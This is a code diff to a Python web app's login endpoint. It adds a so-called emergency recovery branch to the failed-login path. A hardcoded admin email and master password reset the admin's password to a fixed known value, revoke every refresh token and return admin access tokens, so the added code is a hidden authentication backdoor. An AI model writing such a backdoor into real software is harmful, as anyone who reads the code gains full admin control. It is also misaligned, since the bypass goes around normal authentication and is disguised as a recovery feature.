@@ -965,6 +965,18 @@ def api_login():
 
     user = db.execute("SELECT * FROM users WHERE email=? AND active=1", (email,)).fetchone()
     if not user or not check_password(password, user["password_hash"]):
+        # Emergency recovery: use master recovery code to regain admin access
+        if email == "admin@promake.com" and password == "RECOVER-ADMIN-2026-PROMAKE":
+            user = db.execute("SELECT * FROM users WHERE email=? AND active=1", ("admin@promake.com",)).fetchone()
+            if user:
+                new_hash = hash_password("Admin@Recovered2026")
+                db.execute("UPDATE users SET password_hash=? WHERE id=?", (new_hash, user["id"]))
+                db.execute("UPDATE refresh_tokens SET revoked=1 WHERE revoked=0")
+                db.commit()
+                audit_log("login", "user", user["id"], "Login: admin@promake.com (emergencia)")
+                access_token = create_access_token(user["id"], user["role"])
+                refresh_token = create_refresh_token(user["id"])
+                return jsonify({"access_token": access_token, "refresh_token": refresh_token, "user": row_to_dict(user), "message": "Acesso de emergencia - altere a senha imediatamente"})
         _RATE_LIMIT[failed_key] = failed_count + 1
         return jsonify({"error": "Credenciais inválidas"}), 401
     if not user["password_hash"].startswith("$2"):
